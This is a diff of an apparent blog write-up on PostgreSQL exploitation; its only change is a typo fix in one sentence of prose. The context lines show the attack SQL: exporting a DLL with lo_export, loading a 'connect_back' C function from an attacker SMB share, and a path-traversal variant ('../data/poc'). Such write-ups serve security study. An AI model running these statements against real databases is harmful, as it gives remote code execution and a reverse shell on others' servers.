@@ -81,7 +81,7 @@ select lo_export(1337, 'poc.dll');
 create function connect_back(text, integer) returns void as '//attacker/share/poc.dll', 'connect_back' language C strict;
 ```
 
-<p class="cn" markdown="1">However, a few years passed and the PostgreSQL developers decided to block fix paths and alas, that technique is now dead. But we can simply traverse from the lib directory and load our extension! The underlying code of the `create function` appends the `.dll` string, so don't worry about appending it:</p>
+<p class="cn" markdown="1">However, a few years passed and the PostgreSQL developers decided to block fixed paths and alas, that technique is now dead. But we can simply traverse from the lib directory and load our extension! The underlying code of the `create function` appends the `.dll` string, so don't worry about appending it:</p>
 
 ```sql
 create function connect_back(text, integer) returns void as '../data/poc', 'connect_back' language C strict;
